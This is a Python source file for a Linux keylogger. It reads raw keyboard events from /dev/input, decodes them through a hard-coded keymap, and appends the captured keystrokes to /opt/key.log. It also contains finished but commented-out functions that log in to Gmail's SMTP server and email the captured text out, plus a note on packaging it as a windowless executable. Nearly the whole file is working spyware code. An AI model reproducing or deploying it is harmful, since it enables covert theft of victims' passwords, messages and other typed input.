#!/usr/bin/env python3

import sys
import re
import struct
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
'''
pyinstaller -F -w main.py 
'''
#   NEED TO MAKE MY OWN KEYMAP for us keyboard
qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
    27: "$", 28: "\n", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: "m", 40: "ù", 41: "*", 42: "[SHIFT]",
    43: "<", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ";", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
}

BUF_SIZE = 100

def main():
    
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()

        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013")
        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]
        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    in_file = open(infile_path, "rb")

    event = in_file.read(EVENT_SIZE)
    typed = ""
    #loggin in to email
    # try:
    #     login_to_email(username,password)
    # except:
    #     print("Error loggin in")

    while event:
        (_, _, type, code, value) = struct.unpack(FORMAT, event)

        if code != 0 and type == 1 and value == 1:
            if code in qwerty_map:
                typed += qwerty_map[code]
        if len(typed) > BUF_SIZE:
            # try:
            #     sendEmail(username,"Server Log",typed)
            # except:
            #     print("cannot send")
            file=open("/opt/key.log","a+")
            file.write(typed)
            file.close()
            typed = ""
        event = in_file.read(EVENT_SIZE)
    # try:
    #     sendEmail("username,"Final",typed)
    # except:
    #     print("cannot send final")
    # server.quit()
    in_file.close()


def usage():
    print(
        "Usage : ./keylogger [buffer_size]")


def login_to_email(username, password):
    global server, user, passw
    user = username
    passw = password
    domain = "smtp.gmail.com"

    server = smtplib.SMTP(domain, 587)
    server.ehlo()
    server.starttls()
    server.ehlo()

    login_success = authenticate()
    if not login_success:
        return False
    return True


def sendEmail(sendto, subject, text, attachments=[]):
    FROM = user
    TO = sendto
    SUBJECT = subject

    TEXT = text

    BODY = '\r\n'.join(['To: %s' % TO,
                        'From: %s' % FROM,
                        'Subject: %s' % SUBJECT,
                        '', TEXT])
    try:
        server.sendmail(user, [TO], BODY)
        # server.quit()
        print('\n\nYour email was sent!\n\n')
    except:
        print("\n\nError sending mail! Does the recipient's email exist?\n\n")
        raise


# LOGGING INTO THE ACCOUNT
def authenticate():
    try:
        server.login(user, passw)
        return True
    except smtplib.SMTPAuthenticationError:
        return False


def init_arg():
    if len(sys.argv) < 1:
        usage()
        exit()
    global BUF_SIZE
    BUF_SIZE = int(sys.argv[1])



# init_arg()
main()
